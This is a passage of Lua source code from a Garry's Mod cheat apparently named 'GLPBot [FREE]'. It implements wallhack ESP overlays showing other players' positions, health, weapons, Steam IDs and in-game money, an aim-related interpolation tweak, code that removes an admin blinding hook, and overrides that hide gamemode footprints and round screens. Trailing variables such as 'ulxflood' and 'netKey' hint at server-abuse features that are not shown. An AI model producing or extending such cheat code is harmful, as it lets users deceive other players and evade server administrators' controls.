	if gConn("Utilities", "Utilities", "Optimize Game") then
			if not optimized then
				me:ConCommand("r_cleardecals; M9KGasEffect 0")
			optimized = true
		end
	else
			if optimized then
				me:ConCommand("M9KGasEffect 1")
			optimized = false
		end
	end
	if gConn("Aimbot", "WeaponJacker", "No Lerp") then
			if not applied then
				me:ConCommand("cl_interp 0; cl_interp_ratio 0; cl_updaterate 99999")
			applied = true
		end
	else
			if applied then
				me:ConCommand("cl_interp 0; cl_interp_ratio 2; cl_updaterate 30")
			applied = false
		end
	end
	if gConn("Utilities", "Utilities", "TTT: Hide Round Report") and GLPBot.engine.ActiveGamemode() == "terrortown" then
			if not displayed then
				function CLSCORE:ShowPanel() return end
			displayed = true
		end
	end
	if gConn("Utilities", "Utilities", "TTT: Panel Remover") and GLPBot.engine.ActiveGamemode() == "terrortown" then
		local pan = vgui.GetHoveredPanel()
		CheckChild(pan)
	end
	if gConn("Utilities", "Utilities", "Murder: Hide End Round Board") and GLPBot.engine.ActiveGamemode() == "murder" then
		if not displayed then
			function GAMEMODE:DisplayEndRoundBoard(data) return end
			displayed = true
		end
	end
	if gConn("Utilities", "Utilities", "Murder: Hide Footprints") and GLPBot.engine.ActiveGamemode() == "murder" then
		if not footprints then
			function GAMEMODE:DrawFootprints() return end
			footprints = true
		end
	end
	if gConn("Utilities", "Utilities", "Murder: No Black Screens") and GLPBot.engine.ActiveGamemode() == "murder" then
		if not blackscreen then
			function GAMEMODE:RenderScreenspaceEffects() return end
			function GAMEMODE:PostDrawHUD() return end
			blackscreen = true
		end
	end
	if gConn("Extra", "Extra", "Murder Taunts") and GLPBot.engine.ActiveGamemode() == "murder" and me:Alive() and me:Health() > 0 then
		if gOption("Extra", "Extra", "Taunt Type:") == "Funny" then
			RunConsoleCommand("mu_taunt", "funny")
		end
		if gOption("Extra", "Extra", "Taunt Type:") == "Help" then
			RunConsoleCommand("mu_taunt", "help")
		end
		if gOption("Extra", "Extra", "Taunt Type:") == "Scream" then
			RunConsoleCommand("mu_taunt", "scream")
		end
		if gOption("Extra", "Extra", "Taunt Type:") == "Morose" then
			RunConsoleCommand("mu_taunt", "morose")
		end
		if gOption("Extra", "Extra", "Taunt Type:") == "Random" then
			RunConsoleCommand("mu_taunt", tauntspam[math.random(#tauntspam)])
		end
	end
	if gConn("Utilities", "Utilities", "DarkRP: Suicide Near Arrest Batons") and GLPBot.engine.ActiveGamemode() == "darkrp" and me:Alive() and me:Health() > 0 then
		for k, v in next, player.GetAll() do
			if not v:IsValid() or v:Health() < 1 or v:IsDormant() or v == me then continue end
			if gConn("Aimbot", "Aim Options", "Ignore Friends") and v:GetFriendStatus() == "friend" then continue end
			if v:GetPos():Distance(me:GetPos()) < 95 and v:GetActiveWeapon():GetClass() == "arrest_stick" and me:GetPos():Distance(v:GetEyeTrace().HitPos) < 105 then
				me:ConCommand("kill")
			end
		end
	end
	if gConn("Utilities", "Utilities", "DarkRP: Transparent Props") and GLPBot.engine.ActiveGamemode() == "darkrp" then
		for k, v in next, ents.FindByClass("prop_physics") do
			v:SetRenderMode(RENDERMODE_TRANSCOLOR)
			v:SetKeyValue("renderfx", 0)
			v:SetColor(Color(255, 255, 255, gInt("Utilities", "Utilities", "DarkRP: Transparency:")))
		end
		if looped_props then
			looped_props = false
		end
	else
		if not looped_props then
			for k, v in next, ents.FindByClass("prop_physics") do
				v:SetColor(Color(255, 255, 255, 255))
			end
			looped_props = true
		end
	end
	if(gConn("Utilities", "Utilities", "Anti-Blind")) then
		if (HookExist("HUDPaint", "ulx_blind")) then
			MsgR(4.3, "GLPBotC successfully blocked a blindnig attempt.")
			surface.PlaySound("buttons/lightswitch2.wav")
        hook.Remove("HUDPaint", "ulx_blind")
        end
    end
	if MOTDgd or MOTDGD then
		function MOTDgd.GetIfSkip()
		if(gConn("Utilities", "Utilities", "Anti-Ads")) then
			MsgR(4.3, "GLPBotC successfully blocked an advertisement.")
			surface.PlaySound("buttons/lightswitch2.wav")
			return true
			end
		end
	end
end)

hook.Add("PreDrawViewModel", "Hook10", function()
	if(gConn("Extra", "Extra", "Thirdperson")) then return end
	local WepMat1 = Material("models/wireframe")
	if (gConn("Extra", "ViewModel", "ViewModel Frame")) then
	render.MaterialOverride(WepMat1)
	render.SetColorModulation(gInt("Home", "ViewModel Color", "Red:") /255, gInt("Home", "ViewModel Color", "Green:") /255, gInt("Home", "ViewModel Color", "Blue:") / 255)
	end
	local WepMat2 = Material("models/debug/debugwhite")
	if (gConn("Extra", "ViewModel", "ViewModel Chams")) then
	render.MaterialOverride(WepMat2)
	render.SetColorModulation(gInt("Home", "ViewModel Color", "Red:") /255, gInt("Home", "ViewModel Color", "Green:") /255, gInt("Home", "ViewModel Color", "Blue:") / 255)
	end
	if(gConn("Extra", "ViewModel", "No ViewModel") or gConn("Extra", "Extra", "Thirdperson")) then
	return true
	else
	return false
	end
end)

hook.Add("PreDrawPlayerHands", "Hook11", function()
	if(gConn("Extra", "ViewModel", "No Hands") or gConn("Extra", "Extra", "Thirdperson")) then
		return true
	else
		return false
	end
end)

local function AutoReload(pCmd)
	local wep = ply:GetActiveWeapon()
	if(not gConn("Extra", "Extra", "Auto Reload")) then return end
	if (ply:Alive() and ply:Health() > 0 and GLPBot.IsValid(wep)) then
		if (wep:Clip1() <= (gInt("Extra", "Extra", "Auto Reload at:")) and wep:GetMaxClip1() > 0 and GLPBot.CurTime() > wep:GetNextPrimaryFire()) then
			pCmd:SetButtons(pCmd:GetButtons() + IN_RELOAD)
		end
	end
end

local function GetColor(v)
    if(pm.Team(v) == pm.Team(me)) then
		local r = gInt("Home", "Team ESP Color", "Red:")
		local g = gInt("Home", "Team ESP Color", "Green:")
		local b = gInt("Home", "Team ESP Color", "Blue:")
		return(Color(r, g, b, 220))
    end
		local r = gInt("Home", "Enemy ESP Color", "Red:")
		local g = gInt("Home", "Enemy ESP Color", "Green:")
		local b = gInt("Home", "Enemy ESP Color", "Blue:")
	return(Color(r, g, b, 220))
end

local function ESP(v)
	local pos = em.GetPos(v)
	local min, max = em.GetCollisionBounds(v)
	local pos2 = pos + Vector(0, 0, max.z)
	local pos = vm.ToScreen(pos)
	local pos2 = vm.ToScreen(pos2)
	local hh = 0
	local h = pos.y - pos2.y
	local w = h / 2
	local ww = h / 4
	local col = (v) && Color(0, 0, 0) || gConn("ESP", "Extra", "Team Colors") && team.GetColor(pm.Team(v)) || GetColor(v)
	local ocol = (v) && HSVToColor(RealTime()*45%360, 1, 1) || Color(0, 0, 0)
	local colololol = gConn("ESP", "Extra", "Team Colors") && team.GetColor(pm.Team(v)) || GetColor(v)
	local ocolololol = (v) && HSVToColor(RealTime()*45%360, 1, 1) || gConn("ESP", "Extra", "Team Colors") && team.GetColor(pm.Team(v)) || GetColor(v)
	local teamcol = (v) && HSVToColor(RealTime()*45%360, 1, 1) || gConn("ESP", "Extra", "Team Colors") && team.GetColor(pm.Team(v)) || Color(gInt("Home", "Misc ESP Color", "Red:"), gInt("Home", "Misc ESP Color", "Green:"), gInt("Home", "Misc ESP Color", "Blue:"))
	local teamocol = gConn("ESP", "Extra", "Team Colors") && team.GetColor(pm.Team(v)) || Color(gInt("Home", "Misc ESP Color", "Red:"), gInt("Home", "Misc ESP Color", "Green:"), gInt("Home", "Misc ESP Color", "Blue:"))
	local hh = 0
	if(gConn("ESP", "Wallhack", "Box") && gOption("ESP", "Wallhack", "Box Type:") == "2D Box") then
		local friendstatus = pm.GetFriendStatus(v)
		if (friendstatus == "friend") && !(v) then
			surface.SetDrawColor(gInt("Home", "Friend ESP Color", "Red:"), gInt("Home", "Friend ESP Color", "Green:"), gInt("Home", "Friend ESP Color", "Blue:"))
			surface.DrawOutlinedRect(pos.x - w / 2, pos.y - h, w, h)
			surface.SetDrawColor(ocol)
			surface.DrawOutlinedRect(pos.x - w / 2 - 1, pos.y - h - 1, w + 2, h + 2)
			surface.DrawOutlinedRect(pos.x - w / 2 + 1, pos.y - h + 1, w - 2, h - 2)
		else
			surface.SetDrawColor(col)
			surface.DrawOutlinedRect(pos.x - w / 2, pos.y - h, w, h)
			surface.SetDrawColor(ocol)
			surface.DrawOutlinedRect(pos.x - w / 2 - 1, pos.y - h - 1, w + 2, h + 2)
			surface.DrawOutlinedRect(pos.x - w / 2 + 1, pos.y - h + 1, w - 2, h - 2)
		end
	end
	if(gConn("ESP", "Wallhack", "Box") && gOption("ESP", "Wallhack", "Box Type:") == "3D Box") then
	for k, v in pairs(player.GetAll()) do
		if(not em.IsValid(v) or em.Health(v) < 1 or em.IsDormant(v) or v == me or pm.Team(v) == TEAM_SPECTATOR) then continue end
		if(not Filter(v)) then continue end
		if(not EnemyFilter(v)) then continue end
	if v != LocalPlayer() and v:IsValid() and v:Alive() and v:Health() > 0 then
		local eye = v:EyeAngles()
		local min, max = v:WorldSpaceAABB()
		local origin = v:GetPos()
		if !(v) then
			cam.Start3D()
				render.DrawWireframeBox(origin, Angle(0, eye.y, 0), min - origin, max - origin, colololol)
			cam.End3D()
				end
			end
		end
	end
	if(gConn("ESP", "Wallhack", "Box") && gOption("ESP", "Wallhack", "Box Type:") == "3D Box") then
	for k, v in pairs(player.GetAll()) do
		if(not em.IsValid(v) or em.Health(v) < 1 or em.IsDormant(v) or v == me or pm.Team(v) == TEAM_SPECTATOR) then continue end
		if(not Filter(v)) then continue end
		if(not EnemyFilter(v)) then continue end
	if v != LocalPlayer() and v:IsValid() and v:Alive() and v:Health() > 0 then
		local eye = v:EyeAngles()
		local min, max = v:WorldSpaceAABB()
		local origin = v:GetPos()
		if (v) then
			cam.Start3D()
				render.DrawWireframeBox(origin, Angle(0, eye.y, 0), min - origin, max - origin, HSVToColor(RealTime()*45%360, 1, 1))
			cam.End3D()
				end
			end
		end
	end
	if(gConn("ESP", "Wallhack", "Box") && gOption("ESP", "Wallhack", "Box Type:") == "3D Box") then
	for k, v in pairs(player.GetAll()) do
		if(not em.IsValid(v) or em.Health(v) < 1 or em.IsDormant(v) or v == me or pm.Team(v) == TEAM_SPECTATOR) then continue end
		if(not Filter(v)) then continue end
		if(not EnemyFilter(v)) then continue end
	if v != LocalPlayer() and v:IsValid() and v:Alive() and v:Health() > 0 then
		local eye = v:EyeAngles()
		local min, max = v:WorldSpaceAABB()
		local origin = v:GetPos()
		local friendstatus = pm.GetFriendStatus(v)
		if (friendstatus == "friend") && !(v) then
			cam.Start3D()
				render.DrawWireframeBox(origin, Angle(0, eye.y, 0), min - origin, max - origin, Color(gInt("Home", "Friend ESP Color", "Red:"), gInt("Home", "Friend ESP Color", "Green:"), gInt("Home", "Friend ESP Color", "Blue:")))
			cam.End3D()
				end
			end
		end
	end
	if(gConn("ESP", "Wallhack", "Box") && gOption("ESP", "Wallhack", "Box Type:") == "Edged Box") then   
    surface.SetDrawColor(ocolololol)
	x1, y1, x2, y2 = ScrW() * 2, ScrH() * 2, - ScrW(), - ScrH()
		min, max = v:GetCollisionBounds()
		corners = {v:LocalToWorld(Vector(min.x, min.y, min.z)):ToScreen(), v:LocalToWorld(Vector(min.x, max.y, min.z)):ToScreen(), v:LocalToWorld(Vector(max.x, max.y, min.z)):ToScreen(), v:LocalToWorld(Vector(max.x, min.y, min.z)):ToScreen(), v:LocalToWorld(Vector(min.x, min.y, max.z)):ToScreen(), v:LocalToWorld(Vector(min.x, max.y, max.z)):ToScreen(), v:LocalToWorld(Vector(max.x, max.y, max.z)):ToScreen(), v:LocalToWorld(Vector(max.x, min.y, max.z)):ToScreen()}
		for _k, _v in next, corners do
			x1, y1 = math.min(x1, _v.x), math.min(y1, _v.y)
			x2, y2 = math.max(x2, _v.x), math.max(y2, _v.y)
		end
		diff, diff2 = math.abs(x2 - x1), math.abs(y2 - y1)
				surface.DrawLine(x1 + 1, y1 + 1, x1 + (diff*0.225), y1 + 1)
				surface.DrawLine(x1 + 1, y1 + 1, x1 + 1, y1 + (diff2*0.225))
				surface.DrawLine(x1 + 1, y2 - 1, x1 + (diff*0.225), y2 - 1)
				surface.DrawLine(x1 + 1, y2 - 1, x1 + 1, y2 - (diff2*0.225))
				surface.DrawLine(x2 - 1, y1 + 1, x2 - (diff*0.225), y1 + 1)
				surface.DrawLine(x2 - 1, y1 + 1, x2 - 1, y1 + (diff2*0.225))
				surface.DrawLine(x2 - 1, y2 - 1, x2 - (diff*0.225), y2 - 1)
				surface.DrawLine(x2 - 1, y2 - 1, x2 - 1, y2 - (diff2*0.225))
		local friendstatus = pm.GetFriendStatus(v)
		if (friendstatus == "friend") && !(v) then
		surface.SetDrawColor(gInt("Home", "Friend ESP Color", "Red:"), gInt("Home", "Friend ESP Color", "Green:"), gInt("Home", "Friend ESP Color", "Blue:"))
		x1, y1, x2, y2 = ScrW() * 2, ScrH() * 2, - ScrW(), - ScrH()
		min, max = v:GetCollisionBounds()
		corners = {v:LocalToWorld(Vector(min.x, min.y, min.z)):ToScreen(), v:LocalToWorld(Vector(min.x, max.y, min.z)):ToScreen(), v:LocalToWorld(Vector(max.x, max.y, min.z)):ToScreen(), v:LocalToWorld(Vector(max.x, min.y, min.z)):ToScreen(), v:LocalToWorld(Vector(min.x, min.y, max.z)):ToScreen(), v:LocalToWorld(Vector(min.x, max.y, max.z)):ToScreen(), v:LocalToWorld(Vector(max.x, max.y, max.z)):ToScreen(), v:LocalToWorld(Vector(max.x, min.y, max.z)):ToScreen()}
		for _k, _v in next, corners do
			x1, y1 = math.min(x1, _v.x), math.min(y1, _v.y)
			x2, y2 = math.max(x2, _v.x), math.max(y2, _v.y)
		end
		diff, diff2 = math.abs(x2 - x1), math.abs(y2 - y1)
				surface.DrawLine(x1 + 1, y1 + 1, x1 + (diff*0.225), y1 + 1)
				surface.DrawLine(x1 + 1, y1 + 1, x1 + 1, y1 + (diff2*0.225))
				surface.DrawLine(x1 + 1, y2 - 1, x1 + (diff*0.225), y2 - 1)
				surface.DrawLine(x1 + 1, y2 - 1, x1 + 1, y2 - (diff2*0.225))
				surface.DrawLine(x2 - 1, y1 + 1, x2 - (diff*0.225), y1 + 1)
				surface.DrawLine(x2 - 1, y1 + 1, x2 - 1, y1 + (diff2*0.225))
				surface.DrawLine(x2 - 1, y2 - 1, x2 - (diff*0.225), y2 - 1)
				surface.DrawLine(x2 - 1, y2 - 1, x2 - 1, y2 - (diff2*0.225))
		end
     end
	surface.SetFont("ESPFont")
	surface.SetTextColor(255, 255, 255)
	if(gConn("ESP", "Wallhack", "Health Bar")) then
		local hp = h * em.Health(v) / 100
		if(hp > h) then hp = h end
		local diff = h - hp
		surface.SetDrawColor(0, 0, 0, 255)
		surface.DrawRect(pos.x - w / 2 - 8, pos.y - h - 1, 5, h + 2)
		surface.SetDrawColor((100 - em.Health(v)) * 2.55, em.Health(v) * 2.55, 0, 255)
		surface.DrawRect(pos.x - w / 2 - 7, pos.y - h + diff, 3, hp)
	end
	if(gConn("ESP", "Wallhack", "Armor Bar")) then
		local armor = v:Armor() * h / 100
		if(armor > h) then armor = h end
		local diff = h - armor
		surface.SetDrawColor(0, 0, 0, 255)
		surface.DrawRect(pos.x + ww + 3, pos.y - h - 1, 5, h + 2)
		surface.SetDrawColor((100 - v:Armor()) * 2.55, v:Armor() * 2.55, 0, 255)
		surface.DrawRect(pos.x + ww + 4, pos.y - h + diff, 3, armor)
	end
	if(gConn("ESP", "Wallhack", "Name")) then
        local col = Color(255, 255, 255)
		local friendstatus = pm.GetFriendStatus(v)
		if (friendstatus == "friend") then
		draw.SimpleText("Friend", "ESPFont", pos.x, pos.y - h - 13 - 13, Color(gInt("Home", "Friend ESP Color", "Red:"), gInt("Home", "Friend ESP Color", "Green:"), gInt("Home", "Friend ESP Color", "Blue:")), 1, 1)
		end
		if(gConn("ESP", "Wallhack", "Bystander Name") && GLPBot.engine.ActiveGamemode() == "murder") then
		draw.SimpleText(v:GetNWString("bystanderName"), "ESPFont", pos.x, pos.y - h - 1 - (friendstatus == "friend" && 12 || 12), col, 1, 1)
		else
		draw.SimpleText(pm.Name(v), "ESPFont", pos.x, pos.y - h - 1 - (friendstatus == "friend" && 12 || 12), col, 1, 1)
	end
	end
	if(gConn("ESP", "Wallhack", "Enabled") and gConn("ESP", "Wallhack", "Name")) then
		local friendstatus = pm.GetFriendStatus(v)
		if (friendstatus == "friend") then
		if GLPBot.IsMe(v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 26 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		end
		if (friendstatus ~= "friend") then
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		if (v) then
		draw.SimpleText("GLPBot [FREE]", "ESPFont", pos.x, pos.y - h - 13 - 13, HSVToColor(RealTime()*45%360, 1, 1), 1, 1)
		end
		end
	end
	if(gConn("ESP", "Wallhack", "Health Value")) then
	hh = hh + 1
	local col = Color((100 - em.Health(v)) * 2.55, em.Health(v) * 2, 0)
	draw.SimpleText(em.Health(v).." Health", "ESPFont", pos.x, pos.y - 1 + hh, col, 1, 0)
	hh = hh + 9
	end
	if(gConn("ESP", "Wallhack", "Armor Value")) then
	hh = hh + 1
	local col = Color((100 - v:Armor()) * 2.55, v:Armor() * 2, 0)
	draw.SimpleText(v:Armor().." Armor", "ESPFont", pos.x, pos.y - 1 + hh, col, 1, 0)
	hh = hh + 9
	end
	if(gConn("ESP", "Wallhack", "Weapon")) then
	hh = hh + 1
	local w = pm.GetActiveWeapon(v)
	if(w && em.IsValid(w)) then
	local col = Color(200, 150, 150)
	draw.SimpleText(w:GetPrintName(), "ESPFont", pos.x, pos.y - 0 + hh, col, 1, 0)
	hh = hh + 9
	end
	end
	if(gConn("ESP", "Wallhack", "Rank")) then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText(pm.GetUserGroup(v), "ESPFont", pos.x, pos.y - 0 + hh, col, 1, 0)
	hh = hh + 9
	end
	if (gConn("ESP", "Wallhack", "Distance")) then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText(math.Round(v:GetPos():Distance(LocalPlayer():GetPos()) / 40).." Meters", "ESPFont", pos.x, pos.y - 0 + hh, col1, 1, 0)
	hh = hh + 9
	end
	if (gConn("ESP", "Wallhack", "Velocity")) then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText(math.Round(v:GetVelocity():Length()).." Speed", "ESPFont", pos.x, pos.y - 0 + hh, col1, 1, 0)
	hh = hh + 9
	end
	if gConn("ESP", "Wallhack", "Conditions") and v:IsPlayer() then
	if v:InVehicle() then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText("*driving*", "ESPFont", pos.x, pos.y - 0 + hh, col1, 1, 0)
	hh = hh + 9
	elseif v:GetMoveType() == MOVETYPE_NOCLIP then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText("*noclipping*", "ESPFont", pos.x, pos.y - 0 + hh, col1, 1, 0)
	hh = hh + 9
	elseif v:IsDormant() then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText("*dormant*", "ESPFont", pos.x, pos.y - 0 + hh, col1, 1, 0)
	hh = hh + 9
	elseif v:IsFlagSet(2) then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText("*crouching*", "ESPFont", pos.x, pos.y - 0 + hh, col1, 1, 0)
	hh = hh + 9
	elseif v:GetMoveType() == MOVETYPE_LADDER then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText("*climbing*", "ESPFont", pos.x, pos.y - 0 + hh, col1, 1, 0)
	hh = hh + 9
	elseif v:GetColor(v).a < 255 then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText("*spawning*", "ESPFont", pos.x, pos.y - 0 + hh, col1, 1, 0)
	hh = hh + 9
	elseif v:IsFlagSet(64) then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText("*frozen*", "ESPFont", pos.x, pos.y - 0 + hh, col1, 1, 0)
	hh = hh + 9
	elseif v:IsPlayingTaunt() then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText("*emoting*", "ESPFont", pos.x, pos.y - 0 + hh, col1, 1, 0)
	hh = hh + 9
	elseif v:IsFlagSet(1024) then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText("*swimming*", "ESPFont", pos.x, pos.y - 0 + hh, col1, 1, 0)
	hh = hh + 9
	elseif v:IsSprinting() then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText("*sprinting*", "ESPFont", pos.x, pos.y - 0 + hh, col1, 1, 0)
	hh = hh + 9
	elseif v:IsTyping() then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText("*typing*", "ESPFont", pos.x, pos.y - 0 + hh, col1, 1, 0)
	hh = hh + 9
	elseif v:GetMoveType() == MOVETYPE_WALK or v:GetMoveType() == MOVETYPE_NONE then
	hh = hh + 1
	local col = Color(255, 255, 255)
	draw.SimpleText("*none*", "ESPFont", pos.x, pos.y - 0 + hh, col1, 1, 0)
	hh = hh + 9
	end
	end
	if (gConn("ESP", "Wallhack", "Steam ID")) then
	hh = hh + 1
	local col = Color(255, 255, 255)
	if (v:SteamID() ~= "NULL") then
	draw.SimpleText(v:SteamID(v), "ESPFont", pos.x, pos.y - 0 + hh, col, 1, 0)
	else
	draw.SimpleText("BOT", "ESPFont", pos.x, pos.y - 0 + hh, col, 1, 0)
	end
	hh = hh + 9
	end
	if(gConn("ESP", "Wallhack", "Ping")) then
	hh = hh + 1
	local col = Color(v:Ping() * 2.55, 255 - v:Ping() - 5 * 2, 0)
	draw.SimpleText(v:Ping().."ms", "ESPFont", pos.x, pos.y - 0 + hh, col, 1, 0)
	hh = hh + 9
	end
	if(gConn("ESP", "Wallhack", "DarkRP Money")) then
	hh = hh + 1
	if (gmod.GetGamemode().Name == "DarkRP") then
	local col = Color(0, 255, 0)
	if (v:getDarkRPVar("money") == nil) then return end
	draw.SimpleText("$"..v:getDarkRPVar("money"), "ESPFont", pos.x, pos.y - 0 + hh, col, 1, 0)
	hh = hh + 9
	end
	end
	if(gConn("ESP", "Wallhack", "Skeleton")) then
		local col = gConn("ESP", "Extra", "Team Colors") && team.GetColor(pm.Team(v)) || GetColor(v)
		local pos = em.GetPos(v)
		for i = 0, em.GetBoneCount(v) do
		local parent = em.GetBoneParent(v, i)
		if(!parent) then continue end
		local bonepos = em.GetBonePosition(v, i)
		if(bonepos == pos) then continue end
		local parentpos = em.GetBonePosition(v, parent)
		if(!bonepos || !parentpos) then continue end
		local screen1, screen2 = vm.ToScreen(bonepos), vm.ToScreen(parentpos)
		surface.SetDrawColor(teamcol)
		surface.DrawLine(screen1.x, screen1.y, screen2.x, screen2.y)
		end
	end
	if (gConn("ESP", "Wallhack", "Glow")) then
		local wep = v:GetActiveWeapon()
		halo.Add({v, wep}, teamcol, .55, .55, 5, true, true)
	end
	GLPBot.cam.Start3D()
		if (gConn("ESP", "Wallhack", "Vision Line")) then
			local b1, b2 = v:EyePos(), v:GetEyeTrace().HitPos
			GLPBot.render.DrawLine(b1, b2, teamcol)
			GLPBot.render.DrawWireframeSphere(b2, 2, 10, 10, teamcol, b2)
		end
	if (gConn("ESP", "Wallhack", "GlowBRIGHT")) then
		local wep = v:GetActiveWeapon()
		halo.Add({v, wep}, teamcol, .80, .80, 70, true, true)
	end
	GLPBot.cam.End3D()
	if(gConn("ESP", "Wallhack", "HitboxALL")) then
		for k, v in next, player.GetAll() do
			if(not em.IsValid(v) or em.Health(v) < 1 or em.IsDormant(v) or v == me or pm.Team(v) == TEAM_SPECTATOR) then continue end
			if(not Filter(v)) then continue end
			if(not EnemyFilter(v)) then continue end
			for i = 0, v:GetHitBoxGroupCount() - 1 do
			for _i = 0, v:GetHitBoxCount(i) - 1 do
			local bone = v:GetHitBoxBone(_i, i)
			if not (bone) then continue end			
			local min, max = v:GetHitBoxBounds(_i, i)			
			if (v:GetBonePosition(bone)) then
			local pos, ang = v:GetBonePosition(bone)
			if !(v) then
			cam.Start3D()
			render.DrawWireframeBox(pos, ang, min, max, teamocol)
			cam.End3D()
		end
			end
		end
			end
		end
	end
	if(gConn("ESP", "Wallhack", "HitboxALL")) then
		for k, v in next, player.GetAll() do
			if(not em.IsValid(v) or em.Health(v) < 1 or em.IsDormant(v) or v == me or pm.Team(v) == TEAM_SPECTATOR) then continue end
			if(not Filter(v)) then continue end
			if(not EnemyFilter(v)) then continue end
			for i = 0, v:GetHitBoxGroupCount() - 1 do
			for _i = 0, v:GetHitBoxCount(i) - 1 do
			local bone = v:GetHitBoxBone(_i, i)
			if not (bone) then continue end			
			local min, max = v:GetHitBoxBounds(_i, i)
			if (v:GetBonePosition(bone)) then
			local pos, ang = v:GetBonePosition(bone)
			if (v) then
			cam.Start3D()
			render.DrawWireframeBox(pos, ang, min, max, HSVToColor(RealTime()*45%360, 1, 1))
			cam.End3D()
				end
			end
				end
			end
		end
	end
end

spoofchat = 0
local ulxflood = false
local netKey = ""
local Defqon = nil 
